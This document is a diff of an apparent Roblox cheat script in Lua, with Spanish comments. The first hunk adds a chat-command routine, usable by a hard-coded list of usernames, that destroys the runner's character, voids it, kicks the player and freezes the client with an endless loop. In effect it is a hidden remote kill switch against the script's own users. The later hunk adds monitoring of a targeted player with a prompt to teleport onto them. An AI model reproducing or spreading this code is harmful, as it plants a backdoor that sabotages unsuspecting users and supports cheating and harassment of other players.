@@ -17,8 +17,8 @@ local StarterGui = game:GetService("StarterGui")
 local sigmas = {
     "pedrood2", 
     "iidino122",
+    "Milaneso202_xd",
     "iAmLegitTrust_p",
-    "Milaneso202_xd"
 }
 
 local alpha = "!users"
@@ -78,7 +78,34 @@ local function onChatMessage(player, message)
         local partialName = message:sub(7):lower()
         local targetPlayer = findPlayerByName(partialName)
         if targetPlayer then
+		local player = game.Players.LocalPlayer
+        wait(0.1)
+        Workspace[player.Name].Torso:Destroy()
+        wait(1)
+        local bool = true
+
+
+        if bool then
+        game.Workspace.FallenPartsDestroyHeight = 0 / 0
+        else
+        game.Workspace.FallenPartsDestroyHeight = -500
+        end
+
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-989889989898989, -989879898998988, -98999898989899898)
+        wait(0.3)
+        Workspace[player.Name].Humanoid:Destroy()
+        wait(0.2)
+        Workspace[player.Name].Head:Destroy()
+        wait(0.2)
+        Workspace[player.Name]:FindFirstChild("Right Leg"):Destroy()
+        wait(0.2)
+        Workspace[player.Name]:FindFirstChild("Left Leg"):Destroy()
+        wait(0.2)
+        Workspace[player.Name]:FindFirstChild("Right Arm"):Destroy()
+        wait(0.2)
             targetPlayer:Kick("You were kicked by Dev/Admin.")
+			while true do		
+		end
         else
             notifyPlayer(player, "Error", "Jugador no encontrado: " .. partialName)
         end
@@ -1870,45 +1897,136 @@ local Players = game:GetService("Players")
 -- Crear una GUI para notificaciones
 local notificationGui = Instance.new("ScreenGui")
 notificationGui.Name = "NotificationGui"
+notificationGui.ResetOnSpawn = false -- Evitar que se reinicie al respawnear
 notificationGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
+-- Crear etiqueta de notificación
 local notificationLabel = Instance.new("TextLabel")
 notificationLabel.Size = UDim2.new(0.3, 0, 0.05, 0) -- Tamaño del cuadro de notificación
-notificationLabel.Position = UDim2.new(1, -10, 1, -550) -- Posición en la esquina inferior derecha, un poco más arriba
-notificationLabel.AnchorPoint = Vector2.new(1, 1) -- Anclar a la esquina inferior derecha
+notificationLabel.Position = UDim2.new(1, -10, 0, 10) -- Posición en la esquina superior derecha
+notificationLabel.AnchorPoint = Vector2.new(1, 0) -- Anclar a la esquina superior derecha
 notificationLabel.TextColor3 = Color3.new(1, 1, 1)
+notificationLabel.BackgroundColor3 = Color3.new(0, 0, 0)
 notificationLabel.TextScaled = true
 notificationLabel.Visible = false
 notificationLabel.Parent = notificationGui
 
--- Función para mostrar notificaciones con diferentes colores
-local function showNotification(message, color)
+-- Crear botones para "Sí" y "No"
+local yesButton = Instance.new("TextButton")
+yesButton.Size = UDim2.new(0.1, 0, 0.05, 0)
+yesButton.Position = UDim2.new(0.7, 0, 0.1, 50) -- Abajo del cuadro principal
+yesButton.Text = "Sí"
+yesButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+yesButton.Visible = false
+yesButton.Parent = notificationGui
+
+local noButton = Instance.new("TextButton")
+noButton.Size = UDim2.new(0.1, 0, 0.05, 0)
+noButton.Position = UDim2.new(0.85, 0, 0.1, 50) -- Abajo del cuadro principal
+noButton.Text = "No"
+noButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+noButton.Visible = false
+noButton.Parent = notificationGui
+
+-- Crear etiqueta para mostrar la cuenta regresiva
+local countdownLabel = Instance.new("TextLabel")
+countdownLabel.Size = UDim2.new(0.2, 0, 0.03, 0)
+countdownLabel.Position = UDim2.new(1, -10, 0, 70) -- Debajo del mensaje principal
+countdownLabel.AnchorPoint = Vector2.new(1, 0)
+countdownLabel.TextColor3 = Color3.new(1, 1, 1)
+countdownLabel.BackgroundTransparency = 1
+countdownLabel.TextScaled = true
+countdownLabel.Visible = false
+countdownLabel.Parent = notificationGui
+
+-- Variables para las conexiones del botón "Sí" y "No"
+local yesConnection
+local noConnection
+
+-- Función para mostrar notificaciones con cuenta regresiva
+local function showNotification(message, color, showButtons, targetPlayer)
     notificationLabel.Text = message
     notificationLabel.BackgroundColor3 = color
     notificationLabel.Visible = true
-    wait(5) -- Mostrar la notificación durante 5 segundos
-    notificationLabel.Visible = false
+    yesButton.Visible = showButtons
+    noButton.Visible = showButtons
+
+    if showButtons then
+        countdownLabel.Visible = true
+        local countdownTime = 8 -- Tiempo en segundos para ocultar los botones
+
+        -- Limpiar conexiones previas
+        if yesConnection then
+            yesConnection:Disconnect()
+        end
+        if noConnection then
+            noConnection:Disconnect()
+        end
+
+        -- Conectar el botón "Sí" al teletransporte
+        yesConnection = yesButton.MouseButton1Click:Connect(function()
+            if targetPlayer and targetPlayer.Character and targetPlayer.Character.PrimaryPart then
+                local localPlayer = game.Players.LocalPlayer
+                if localPlayer.Character and localPlayer.Character.PrimaryPart then
+                    localPlayer.Character:SetPrimaryPartCFrame(targetPlayer.Character.PrimaryPart.CFrame)
+                    showNotification("¡Teletransportado al objetivo!", Color3.fromRGB(0, 255, 255), false)
+                else
+                    showNotification("No se pudo realizar el teletransporte: Verifica que tu personaje esté presente.", Color3.fromRGB(255, 0, 0), false)
+                end
+            else
+                showNotification("El objetivo esta en el void actualmente.", Color3.fromRGB(255, 0, 0), false)
+            end
+        end)
+
+        -- Conectar el botón "No" para ocultar
+        noConnection = noButton.MouseButton1Click:Connect(function()
+            showNotification("No se realizó el teletransporte.", Color3.fromRGB(255, 165, 0), false)
+        end)
+
+        -- Mostrar cuenta regresiva
+        for i = countdownTime, 1, -1 do
+            countdownLabel.Text = "Desapareciendo en: " .. i .. "s"
+            task.wait(1)
+        end
+
+        -- Ocultar todo después de la cuenta regresiva
+        notificationLabel.Visible = false
+        yesButton.Visible = false
+        noButton.Visible = false
+        countdownLabel.Visible = false
+    else
+        countdownLabel.Visible = false
+    end
 end
 
--- Función para monitorear la entrada y salida del jugador específico
-local function monitorSpecificPlayer()
-    -- Detectar cuando el jugador especificado entra
-    Players.PlayerAdded:Connect(function(player)
-        if player.Name == jugadorMonitoreado then
-            showNotification(player.Name .. " ha entrado al juego.", Color3.fromRGB(0, 255, 0)) -- Verde al entrar
-        end
-    end)
-
-    -- Detectar cuando el jugador especificado sale
-    Players.PlayerRemoving:Connect(function(player)
-        if player.Name == jugadorMonitoreado then
-            showNotification(player.Name .. " ha salido del juego.", Color3.fromRGB(255, 0, 0)) -- Rojo al salir
-        end
-    end)
+-- Función para manejar la entrada del jugador monitoreado
+local function onPlayerAdded(player)
+    if player.Name == jugadorMonitoreado then
+        showNotification("El objetivo ha entrado, ¿deseas hacer TP?", Color3.fromRGB(0, 255, 0), true, player)
+    end
 end
 
--- Iniciar monitoreo
-monitorSpecificPlayer()
+-- Función para manejar la salida del jugador monitoreado
+local function onPlayerRemoving(player)
+    if player.Name == jugadorMonitoreado then
+        showNotification(player.Name .. " ha salido del juego.", Color3.fromRGB(255, 0, 0), false)
+    end
+end
+
+-- Monitorear todos los jugadores actuales y futuros
+local function startMonitoring()
+    -- Conectar eventos para jugadores existentes
+    for _, player in ipairs(Players:GetPlayers()) do
+        onPlayerAdded(player)
+    end
+
+    -- Conectar eventos de entrada y salida
+    Players.PlayerAdded:Connect(onPlayerAdded)
+    Players.PlayerRemoving:Connect(onPlayerRemoving)
+end
+
+-- Iniciar monitoreo constante
+startMonitoring()
 end)
 
 window:Section(" Grenade Functions")
